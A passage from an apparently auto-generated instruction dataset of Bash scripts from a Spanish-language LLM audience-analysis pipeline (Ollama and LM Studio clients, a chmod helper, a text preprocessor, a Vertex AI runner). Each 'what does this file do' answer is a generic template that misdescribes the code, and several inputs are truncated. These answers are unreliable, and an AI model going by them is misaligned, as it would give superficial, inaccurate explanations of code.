 echo \"\"\n    echo \"Uso: $0 \\\"prompt\\\" [modelo]\"\n    echo \"\"\n    echo \"Modelos:\"\n    echo \"  gemini-1.5-flash  (barato\n```", "output": "This file `gemini-client.sh` is part of the pipeline project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for lmstudio-client.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\lmstudio-client.sh`:\n\n```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  LM STUDIO CLIENT - ConexiÃ³n a modelo local                   â•‘\n# â•‘  PROPIEDAD INTELECTUAL: PATRICIO MIGUEL MARTIN MENDEZ         â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\nLM_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\ncase \"$1\" in\n    check|ping)\n        echo -n \"LM Studio ($LM_URL): \"\n        curl -s --connect-timeout 3 \"$LM_URL/models\" >/dev/null 2>&1 && echo \"âœ… OK\" || echo \"âŒ DOWN\"\n        ;;\n    models)\n        curl -s \"$LM_URL/models\" | jq '.data[].id' 2>/dev/null || echo \"No disponible\"\n        ;;\n    chat|ask)\n        shift\n        curl -s \"$LM_URL/chat/completions\" \\\n            -H \"Content-Type: application/json\" \\\n            -d \"{\\\"model\\\":\\\"local-model\\\",\\\"messages\\\":[{\\\"role\\\":\\\"user\\\",\\\"content\\\":\\\"$*\\\"}]}\" \\\n            | jq -r '.choices[0].message.content' 2>/dev/null\n        ;;\n    *)\n        echo \"LM Studio Client\"\n        echo \"  lm check       - Verificar conexiÃ³n\"\n        echo \"  lm models      - Listar modelos\"\n        echo \"  lm chat <msg>  - Enviar mensaje\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file lmstudio-client.sh do?", "input": "```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  LM STUDIO CLIENT - ConexiÃ³n a modelo local                   â•‘\n# â•‘  PROPIEDAD INTELECTUAL: PATRICIO MIGUEL MARTIN MENDEZ         â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\nLM_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\ncase \"$1\" in\n    check|ping)\n        echo -n \"LM Studio ($LM_URL): \"\n        curl -s --connect-timeout 3 \"$LM_URL/models\" >/dev/null 2>&1 && echo \"âœ… OK\" || echo \"âŒ DOWN\"\n        ;;\n    models)\n        curl -s \"$LM_URL/models\" | jq '.data[].id' 2>/dev/null || echo \"No disponible\"\n        ;;\n    chat|ask)\n        shift\n        curl -s \"$LM_URL/chat/completions\" \\\n            -H \"Content-Type: application/json\" \\\n            -d \"{\\\"model\\\":\\\"local-model\\\",\\\"messages\\\":[{\\\"role\\\":\\\"user\\\",\\\"content\\\":\\\"$*\\\"}]}\" \\\n            | jq -r '.choices[0].message.content' 2>/dev/null\n        ;;\n    *)\n        echo \"LM Studio Client\"\n        echo \"  lm check       - Verificar conexiÃ³n\"\n        echo \"  lm models      - Listar modelos\"\n        echo \"  lm chat <msg>  - Enviar mensaje\"\n        ;;\nesac\n\n```", "output": "This file `lmstudio-client.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ollama-client.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\ollama-client.sh`:\n\n```sh\n#!/bin/bash\n# Cliente para llamar a Ollama en Host Windows desde VM Ubuntu\n# Uso: ./ollama-client.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n de Ollama (Host Windows)\nOLLAMA_HOST=\"${OLLAMA_HOST:-192.168.192.2}\"\nOLLAMA_PORT=\"${OLLAMA_PORT:-11434}\"\nOLLAMA_MODEL=\"${2:-llama3:8b}\"\nOLLAMA_URL=\"http://${OLLAMA_HOST}:${OLLAMA_PORT}\"\n\n# Colores\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[OLLAMA]${NC} $1\" >&2; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\" >&2; exit 1; }\n\n# Verificar conectividad\ncheck_connection() {\n    log \"Verificando conexiÃ³n a Ollama ($OLLAMA_URL)...\"\n    if ! curl -s --connect-timeout 5 \"$OLLAMA_URL/api/tags\" > /dev/null 2>&1; then\n        error \"No se puede conectar a Ollama en $OLLAMA_URL\n\nAsegÃºrate de que en Windows:\n1. Ollama estÃ¡ corriendo: ollama serve\n2. Firewall permite puerto 11434\n3. OLLAMA_HOST=0.0.0.0:11434 estÃ¡ configurado\"\n    fi\n    log \"ConexiÃ³n OK\"\n}\n\n# Listar modelos disponibles\nlist_models() {\n    log \"Modelos disponibles:\"\n    curl -s \"$OLLAMA_URL/api/tags\" | jq -r '.models[].name' 2>/dev/null || echo \"Error listando modelos\"\n}\n\n# Llamar a Ollama\ncall_ollama() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n\n    log \"Modelo: $model\"\n    log \"Enviando prompt...\"\n\n    local response=$(curl -s \"$OLLAMA_URL/api/generate\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"model\\\": \\\"$model\\\",\n            \\\"prompt\\\": \\\"$prompt\\\",\n            \\\"stream\\\": false\n        }\" 2>/dev/null)\n\n    if [[ -z \"$response\" ]]; then\n        error \"Sin respuesta de Ollama\"\n    fi\n\n    # Extraer solo la respuesta\n    echo \"$response\" | jq -r '.response' 2>/dev/null || echo \"$response\"\n}\n\n# Pre-procesar datos de audiencia (tarea especÃ­fica)\npreprocess_audience_data() {\n    local data=\"$1\"\n\n    local prompt=\"Eres un analista de datos. Pre-procesa estos datos de encuestas de redes sociales:\n1. Limpia datos irrelevantes o spam\n2. Extrae keywords principales\n3. Clasifica sentimiento (positivo/neutro/negativo)\n4. Resume en JSON estructurado\n\nDatos:\n$data\n\nResponde SOLO con JSON vÃ¡lido.\"\n\n    call_ollama \"$prompt\" \"$OLLAMA_MODEL\"\n}\n\n# Main\nmain() {\n    local action=\"$1\"\n    shift || true\n\n    case \"$action\" in\n        --check)\n            check_connection\n            ;;\n        --list)\n            check_connection\n            list_models\n            ;;\n        --preprocess)\n            check_connection\n            preprocess_audience_data \"$1\"\n            ;;\n        --help|-h)\n            echo \"Uso: $0 <opciÃ³n>\"\n            echo \"\"\n            echo \"Opciones:\"\n            echo \"  --check              Verificar conexiÃ³n a Ollama\"\n            echo \"  --list               Listar modelos disponibles\"\n            echo \"  --preprocess <data>  Pre-procesar datos de audiencia\"\n            echo \"  <prompt> [modelo]    Enviar prompt directo\"\n            echo \"\"\n            echo \"Variables de entorno:\"\n            echo \"  OLLAMA_HOST  Host de Ollama (default: 192.168.192.2)\"\n            echo \"  OLLAMA_PORT  Puerto (default: 11434)\"\n            ;;\n        *)\n            if [[ -n \"$action\" ]]; then\n                check_connection\n                call_ollama \"$action\" \"${1:-$OLLAMA_MODEL}\"\n            else\n                echo \"Uso: $0 --help\"\n            fi\n            ;;\n    esac\n}\n\nmain \"$@\"\n\n```"}
{"instruction": "What does the file ollama-client.sh do?", "input": "```sh\n#!/bin/bash\n# Cliente para llamar a Ollama en Host Windows desde VM Ubuntu\n# Uso: ./ollama-client.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n de Ollama (Host Windows)\nOLLAMA_HOST=\"${OLLAMA_HOST:-192.168.192.2}\"\nOLLAMA_PORT=\"${OLLAMA_PORT:-11434}\"\nOLLAMA_MODEL=\"${2:-llama3:8b}\"\nOLLAMA_URL=\"http://${OLLAMA_HOST}:${OLLAMA_PORT}\"\n\n# Colores\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[OLLAMA]${NC} $1\" >&2; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\" >&2; exit 1; }\n\n# Verificar conectividad\ncheck_connection() {\n    log \"Verificando conexiÃ³n a Ollama ($OLLAMA_URL)...\"\n    if ! curl -s --connect-timeout 5 \"$OLLAMA_URL/api/tags\" > /dev/null 2>&1; then\n        error \"No se puede conectar a Ollama en $OLLAMA_URL\n\nAsegÃºrate de que en Windows:\n1. Ollama estÃ¡ corriendo: ollama serve\n2. Firewall permite puerto 11434\n3. OLLAMA_HOST=0.0.0.0:11434 estÃ¡ configurado\"\n    fi\n    log \"ConexiÃ³n OK\"\n}\n\n# Listar modelos disponibles\nlist_models() {\n    log \"Modelos disponibles:\"\n    curl -s \"$OLLAMA_URL/api/tags\" | jq -r '.models[].name' 2>/dev/null || echo \"Error listando modelos\"\n}\n\n# Llamar a Ollama\ncall_ollama() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n\n    log \"Modelo: $model\"\n    log \"Enviando prompt...\"\n\n    local response=$(curl -s \"$OLLAMA_URL/api/generate\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"model\\\": \\\"$model\\\",\n            \\\"prompt\\\": \\\"$prompt\\\",\n            \\\"stream\\\": false\n        }\" 2>/dev/null)\n\n    if [[ -z \"$response\" ]]; then\n        error \"Sin respuesta de Ollama\"\n    fi\n\n    # Extraer solo la respuesta\n    echo \"$response\" | jq -r '.response' 2>/dev/null || echo \"$response\"\n}\n\n# Pre-procesar datos de audiencia (tarea especÃ­fica)\npreprocess_audience_data() {\n    local data=\"$1\"\n\n    local prompt=\"Eres un analista de datos. Pre-procesa estos datos de encuestas de re\n```", "output": "This file `ollama-client.sh` is part of the pipeline project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for perms.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\perms.sh`:\n\n```sh\n#!/bin/bash\n# PERMS - GestiÃ³n rÃ¡pida de permisos\n# Uso: perms <acciÃ³n> [archivo]\n\ncase \"$1\" in\n    x|exec)\n        chmod +x \"$2\" && echo \"âœ… Ejecutable: $2\"\n        ;;\n    r|read)\n        chmod 644 \"$2\" && echo \"âœ… Solo lectura: $2\"\n        ;;\n    rw)\n        chmod 666 \"$2\" && echo \"âœ… Lectura/escritura: $2\"\n        ;;\n    private|priv)\n        chmod 600 \"$2\" && echo \"ðŸ”’ Privado: $2\"\n        ;;\n    dir)\n        chmod 755 \"$2\" && echo \"ðŸ“ Directorio: $2\"\n        ;;\n    all)\n        chmod -R +x /home/patricio/pipeline/*.sh\n        chmod -R +x /home/patricio/pipeline/corleone/**/*.sh 2>/dev/null\n        echo \"âœ… Todos los scripts ejecutables\"\n        ;;\n    show|ls)\n        ls -la \"${2:-.}\"\n        ;;\n    *)\n        echo \"perms x <file>      â†’ ejecutable\"\n        echo \"perms r <file>      â†’ solo lectura\"\n        echo \"perms rw <file>     â†’ lectura/escritura\"\n        echo \"perms private <file>â†’ solo owner\"\n        echo \"perms dir <dir>     â†’ directorio\"\n        echo \"perms all           â†’ todos los .sh ejecutables\"\n        echo \"perms show [path]   â†’ ver permisos\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file perms.sh do?", "input": "```sh\n#!/bin/bash\n# PERMS - GestiÃ³n rÃ¡pida de permisos\n# Uso: perms <acciÃ³n> [archivo]\n\ncase \"$1\" in\n    x|exec)\n        chmod +x \"$2\" && echo \"âœ… Ejecutable: $2\"\n        ;;\n    r|read)\n        chmod 644 \"$2\" && echo \"âœ… Solo lectura: $2\"\n        ;;\n    rw)\n        chmod 666 \"$2\" && echo \"âœ… Lectura/escritura: $2\"\n        ;;\n    private|priv)\n        chmod 600 \"$2\" && echo \"ðŸ”’ Privado: $2\"\n        ;;\n    dir)\n        chmod 755 \"$2\" && echo \"ðŸ“ Directorio: $2\"\n        ;;\n    all)\n        chmod -R +x /home/patricio/pipeline/*.sh\n        chmod -R +x /home/patricio/pipeline/corleone/**/*.sh 2>/dev/null\n        echo \"âœ… Todos los scripts ejecutables\"\n        ;;\n    show|ls)\n        ls -la \"${2:-.}\"\n        ;;\n    *)\n        echo \"perms x <file>      â†’ ejecutable\"\n        echo \"perms r <file>      â†’ solo lectura\"\n        echo \"perms rw <file>     â†’ lectura/escritura\"\n        echo \"perms private <file>â†’ solo owner\"\n        echo \"perms dir <dir>     â†’ directorio\"\n        echo \"perms all           â†’ todos los .sh ejecutables\"\n        echo \"perms show [path]   â†’ ver permisos\"\n        ;;\nesac\n\n```", "output": "This file `perms.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for preprocess.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\preprocess.sh`:\n\n```sh\n#!/bin/bash\n# Pre-procesamiento local de datos (antes de enviar a LLM)\n# Limpia, filtra y reduce datos para ahorrar tokens/crÃ©ditos\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# Colores\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[PREPROCESS]${NC} $1\" >&2; }\n\n# Limpiar texto bÃ¡sico\nclean_text() {\n    local input=\"$1\"\n    echo \"$input\" | \\\n        # Remover URLs\n        sed -E 's|https?://[^ ]+||g' | \\\n        # Remover menciones @usuario\n        sed -E 's|@[a-zA-Z0-9_]+||g' | \\\n        # Remover hashtags excesivos (mantener algunos)\n        sed -E 's|#[a-zA-Z0-9_]+||g' | \\\n        # Normalizar espacios\n        tr -s ' ' | \\\n        # Remover lÃ­neas vacÃ­as\n        grep -v '^[[:space:]]*$' || true\n}\n\n# Filtrar spam/ruido comÃºn\nfilter_spam() {\n    local input=\"$1\"\n    echo \"$input\" | \\\n        # Filtrar lÃ­neas muy cortas (< 10 chars)\n        awk 'length > 10' | \\\n        # Filtrar patrones de spam comunes\n        grep -v -i -E '(follow me|check my|link in bio|dm for|free money|giveaway)' || true\n}\n\n# Extraer keywords (frecuencia de palabras)\nextract_keywords() {\n    local input=\"$1\"\n    local top_n=\"${2:-20}\"\n\n    echo \"$input\" | \\\n        # Convertir a minÃºsculas\n        tr '[:upper:]' '[:lower:]' | \\\n        # Separar palabras\n        tr -cs '[:alpha:]' '\\n' | \\\n        # Filtrar stopwords comunes\n        grep -v -E '^(the|a|an|is|are|was|were|be|been|being|have|has|had|do|does|did|will|would|could|should|may|might|must|shall|can|need|dare|ought|used|to|of|in|for|on|with|at|by|from|as|into|through|during|before|after|above|below|between|under|again|further|then|once|here|there|when|where|why|how|all|each|few|more|most|other|some|such|no|nor|not|only|own|same|so|than|too|very|just|also|now|and|but|or|if|because|until|while|although|though|even|i|you|he|she|it|we|they|me|him|her|us|them|my|your|his|its|our|their|this|that|these|those|que|de|la|el|en|y|a|los|las|un|una|es|se|del|por|con|para|su|al|lo|como|mÃ¡s|pero|sus|le|ya|o|porque|cuando|muy|sin|sobre|tambiÃ©n|me|hasta|hay|donde|quien|desde|todo|nos|durante|todos|uno|les|ni|contra|otros|ese|eso|ante|ellos|e|esto|mi|antes|algunos|quÃ©|unos|yo|otro|otras|otra|Ã©l|tanto|esa|estos|mucho|quienes|nada|muchos|cual|poco|ella|estar|estas|algunas|algo|nosotros|tu|ellas|ese|ti)$' | \\\n        # Contar frecuencia\n        sort | uniq -c | sort -rn | \\\n        # Top N\n        head -n \"$top_n\" | \\\n        # Formatear como JSON array\n        awk '{print \"\\\"\" $2 \"\\\"\"}' | paste -sd, | sed 's/^/[/;s/$/]/'\n}\n\n# Agregar datos por categorÃ­a\naggregate_data() {\n    local input=\"$1\"\n    local total_lines=$(echo \"$input\" | wc -l)\n    local total_chars=$(echo \"$input\" | wc -c)\n    local avg_length=$((total_chars / (total_lines + 1)))\n\n    cat <<EOF\n{\n  \"stats\": {\n    \"total_entries\": $total_lines,\n    \"total_chars\": $total_chars,\n    \"avg_length\": $avg_length\n  },\n  \"keywords\": $(extract_keywords \"$input\" 15),\n  \"sample\": $(echo \"$input\" | head -5 | jq -R -s 'split(\"\\n\") | .[:-1]')\n}\nEOF\n}\n\n# Pipeline completo de pre-procesamiento\npreprocess_full() {\n    local input_file=\"$1\"\n    local output_file=\"${2:-/dev/stdout}\"\n\n    if [[ ! -f \"$input_file\" ]]; then\n        echo \"Error: Archivo no encontrado: $input_file\" >&2\n        exit 1\n    fi\n\n    log \"Procesando: $input_file\"\n\n    local data=$(cat \"$input_file\")\n    local original_size=${#data}\n\n    log \"TamaÃ±o original: $original_size bytes\"\n\n    # Aplicar filtros\n    data=$(clean_text \"$data\")\n    data=$(filter_spam \"$data\")\n\n    local processed_size=${#data}\n    local reduction=$((100 - (processed_size * 100 / original_size)))\n\n    log \"TamaÃ±o procesado: $processed_size bytes (reducciÃ³n: ${reduction}%)\"\n\n    # Generar output agregado\n    aggregate_data \"$data\" > \"$output_file\"\n\n    log \"Output: $output_file\"\n}\n\n# Main\ncase \"$1\" in\n    --clean)\n        clean_text \"$(cat \"${2:-/dev/stdin}\")\"\n        ;;\n    --filter)\n        filter_spam \"$(cat \"${2:-/dev/stdin}\")\"\n        ;;\n    --keywords)\n        extract_keywords \"$(cat \"${2:-/dev/stdin}\")\" \"$3\"\n        ;;\n    --aggregate)\n        aggregate_data \"$(cat \"${2:-/dev/stdin}\")\"\n        ;;\n    --full)\n        preprocess_full \"$2\" \"$3\"\n        ;;\n    --help|-h)\n        echo \"Uso: $0 <opciÃ³n> [archivo]\"\n        echo \"\"\n        echo \"Opciones:\"\n        echo \"  --clean [archivo]        Limpiar texto (URLs, menciones, etc.)\"\n        echo \"  --filter [archivo]       Filtrar spam/ruido\"\n        echo \"  --keywords [archivo] [n] Extraer top N keywords\"\n        echo \"  --aggregate [archivo]    Agregar estadÃ­sticas\"\n        echo \"  --full <input> [output]  Pipeline completo\"\n        echo \"\"\n        echo \"Ejemplo:\"\n        echo \"  $0 --full data/encuesta.txt data/processed.json\"\n        ;;\n    *)\n        if [[ -f \"$1\" ]]; then\n            preprocess_full \"$1\"\n        else\n            echo \"Uso: $0 --help\"\n        fi\n        ;;\nesac\n\n```"}
{"instruction": "What does the file preprocess.sh do?", "input": "```sh\n#!/bin/bash\n# Pre-procesamiento local de datos (antes de enviar a LLM)\n# Limpia, filtra y reduce datos para ahorrar tokens/crÃ©ditos\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# Colores\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[PREPROCESS]${NC} $1\" >&2; }\n\n# Limpiar texto bÃ¡sico\nclean_text() {\n    local input=\"$1\"\n    echo \"$input\" | \\\n        # Remover URLs\n        sed -E 's|https?://[^ ]+||g' | \\\n        # Remover menciones @usuario\n        sed -E 's|@[a-zA-Z0-9_]+||g' | \\\n        # Remover hashtags excesivos (mantener algunos)\n        sed -E 's|#[a-zA-Z0-9_]+||g' | \\\n        # Normalizar espacios\n        tr -s ' ' | \\\n        # Remover lÃ­neas vacÃ­as\n        grep -v '^[[:space:]]*$' || true\n}\n\n# Filtrar spam/ruido comÃºn\nfilter_spam() {\n    local input=\"$1\"\n    echo \"$input\" | \\\n        # Filtrar lÃ­neas muy cortas (< 10 chars)\n        awk 'length > 10' | \\\n        # Filtrar patrones de spam comunes\n        grep -v -i -E '(follow me|check my|link in bio|dm for|free money|giveaway)' || true\n}\n\n# Extraer keywords (frecuencia de palabras)\nextract_keywords() {\n    local input=\"$1\"\n    local top_n=\"${2:-20}\"\n\n    echo \"$input\" | \\\n        # Convertir a minÃºsculas\n        tr '[:upper:]' '[:lower:]' | \\\n        # Separar palabras\n        tr -cs '[:alpha:]' '\\n' | \\\n        # Filtrar stopwords comunes\n        grep -v -E '^(the|a|an|is|are|was|were|be|been|being|have|has|had|do|does|did|will|would|could|should|may|might|must|shall|can|need|dare|ought|used|to|of|in|for|on|with|at|by|from|as|into|through|during|before|after|above|below|between|under|again|further|then|once|here|there|when|where|why|how|all|each|few|more|most|other|some|such|no|nor|not|only|own|same|so|than|too|very|just|also|now|and|but|or|if|because|until|while|although|though|even|i|you|he|she|it|we|they|me|him|her|us|them|my|your|his|its|our|their|this|that|these|those|que|de|la|el|en|y|a|los|la\n```", "output": "This file `preprocess.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for run-pipeline.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\run-pipeline.sh`:\n\n```sh\n#!/bin/bash\n# Pipeline: AnÃ¡lisis de Audiencia con EncriptaciÃ³n\n# Flujo: Datos â†’ Encriptar â†’ Gemini â†’ Antigravity â†’ Sheets\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\"\n\n# Colores para output\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[PIPELINE]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\"; exit 1; }\n\n# Crear directorios si no existen\nmkdir -p \"$DATA_DIR/raw\" \"$DATA_DIR/encrypted\" \"$DATA_DIR/processed\"\n\n# FunciÃ³n: Encriptar datos de entrada\nencrypt_input() {\n    local input_file=\"$1\"\n    local encrypted_file=\"$DATA_DIR/encrypted/$(basename \"$input_file\").enc\"\n\n    log \"Encriptando: $input_file\"\n    \"$SCRIPT_DIR/encrypt.sh\" \"$input_file\" \"$encrypted_file\"\n    echo \"$encrypted_file\"\n}\n\n# FunciÃ³n: Llamar a Gemini para optimizar prompt\ncall_gemini() {\n    local data=\"$1\"\n    local prompt_template=\"$2\"\n\n    log \"Llamando a Gemini ($GEMINI_MODEL)...\"\n\n    # Construir prompt para anÃ¡lisis de audiencia\n    local full_prompt=\"Eres un experto en anÃ¡lisis de audiencia y marketing digital.\nAnaliza los siguientes datos de encuestas y genera insights sobre:\n1. Intereses principales de la audiencia\n2. Tendencias detectadas\n3. Recomendaciones de contenido\n\nDatos:\n$data\n\nFormato de salida: JSON con campos 'intereses', 'tendencias', 'recomendaciones'\"\n\n    # Llamar a Vertex AI\n    local response=$(\"$GCLOUD_PATH/gcloud\" ai models predict \\\n        --region=\"$GEMINI_REGION\" \\\n        --model=\"publishers/google/models/$GEMINI_MODEL\" \\\n        --json-request=\"{\\\"instances\\\":[{\\\"content\\\":\\\"$full_prompt\\\"}]}\" \\\n        2>/dev/null || echo '{\"error\": \"API call failed\"}')\n\n    echo \"$response\"\n}\n\n# FunciÃ³n: Procesar datos de Instagram\nprocess_instagram() {\n    local input_file=\"$1\"\n    log \"Procesando datos de Instagram...\"\n\n    if [[ \"$ENCRYPT_ALL_DATA\" == \"true\" ]]; then\n        local encrypted=$(encrypt_input \"$input_file\")\n        # Desencriptar temporalmente para procesar\n        local temp_file=$(mktemp)\n        \"$SCRIPT_DIR/decrypt.sh\" \"$encrypted\" \"$temp_file\"\n        local data=$(cat \"$temp_file\")\n        rm \"$temp_file\"\n    else\n        local data=$(cat \"$input_file\")\n    fi\n\n    call_gemini \"$data\" \"instagram\"\n}\n\n# FunciÃ³n: Procesar datos de LinkedIn\nprocess_linkedin() {\n    local input_file=\"$1\"\n    log \"Procesando datos de LinkedIn...\"\n\n    if [[ \"$ENCRYPT_ALL_DATA\" == \"true\" ]]; then\n        local encrypted=$(encrypt_input \"$input_file\")\n        local temp_file=$(mktemp)\n        \"$SCRIPT_DIR/decrypt.sh\" \"$encrypted\" \"$temp_file\"\n        local data=$(cat \"$temp_file\")\n        rm \"$temp_file\"\n    else\n        local data=$(cat \"$input_file\")\n    fi\n\n    call_gemini \"$data\" \"linkedin\"\n}\n\n# FunciÃ³n principal\nmain() {\n    local source=\"$1\"\n    local input_file=\"$2\"\n\n    if [[ -z \"$source\" || -z \"$input_file\" ]]; then\n        echo \"Uso: $0 <instagram|linkedin> <archivo_datos>\"\n        echo \"\"\n        echo \"Ejemplo:\"\n        echo \"  $0 instagram data/encuesta_ig.json\"\n        exit 1\n    fi\n\n    log \"Iniciando pipeline de anÃ¡lisis...\"\n    log \"Fuente: $source\"\n    log \"EncriptaciÃ³n: $ENCRYPT_ALL_DATA\"\n\n    case \"$source\" in\n        instagram)\n            process_instagram \"$input_file\"\n            ;;\n        linkedin)\n            process_linkedin \"$input_file\"\n            ;;\n        *)\n            error \"Fuente no soportada: $source (usa: instagram, linkedin)\"\n            ;;\n    esac\n\n    log \"Pipeline completado.\"\n}\n\nmain \"$@\"\n\n```"}
{"instruction": "What does the file run-pipeline.sh do?", "input": "```sh\n#!/bin/bash\n# Pipeline: AnÃ¡lisis de Audiencia con EncriptaciÃ³n\n# Flujo: Datos â†’ Encriptar â†’ Gemini â†’ Antigravity â†’ Sheets\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\"\n\n# Colores para output\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[PIPELINE]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerror() { echo -e \"${RED}[ERROR]${NC} $1\"; exit 1; }\n\n# Crear directorios si no existen\nmkdir -p \"$DATA_DIR/raw\" \"$DATA_DIR/encrypted\" \"$DATA_DIR/processed\"\n\n# FunciÃ³n: Encriptar datos de entrada\nencrypt_input() {\n    local input_file=\"$1\"\n    local encrypted_file=\"$DATA_DIR/encrypted/$(basename \"$input_file\").enc\"\n\n    log \"Encriptando: $input_file\"\n    \"$SCRIPT_DIR/encrypt.sh\" \"$input_file\" \"$encrypted_file\"\n    echo \"$encrypted_file\"\n}\n\n# FunciÃ³n: Llamar a Gemini para optimizar prompt\ncall_gemini() {\n    local data=\"$1\"\n    local prompt_template=\"$2\"\n\n    log \"Llamando a Gemini ($GEMINI_MODEL)...\"\n\n    # Construir prompt para anÃ¡lisis de audiencia\n    local full_prompt=\"Eres un experto en anÃ¡lisis de audiencia y marketing digital.\nAnaliza los siguientes datos de encuestas y genera insights sobre:\n1. Intereses principales de la audiencia\n2. Tendencias detectadas\n3. Recomendaciones de contenido\n\nDatos:\n$data\n\nFormato de salida: JSON con campos 'intereses', 'tendencias', 'recomendaciones'\"\n\n    # Llamar a Vertex AI\n    local response=$(\"$GCLOUD_PATH/gcloud\" ai models predict \\\n        --region=\"$GEMINI_REGION\" \\\n        --model=\"publishers/google/models/$GEMINI_MODEL\" \\\n        --json-request=\"{\\\"instances\\\":[{\\\"content\\\":\\\"$full_prompt\\\"}]}\" \\\n        2>/dev/null || echo '{\"error\": \"API call failed\"}')\n\n    echo \"$response\"\n}\n\n# FunciÃ³n: Procesar datos de Instagram\nprocess_instagram() {\n    local input_file=\"$1\"\n    log \"Procesando datos de Instagram...\"\n\n    if [[ \"$ENCRYPT_ALL_DATA\" == \"true\" ]]; then\n        local encrypted=$(encrypt_input \"$input_file\")\n      \n```", "output": "This file `run-pipeline.sh` is part of the pipeline project. Based on the code structure, it appears to handle API endpoints and request handling."}
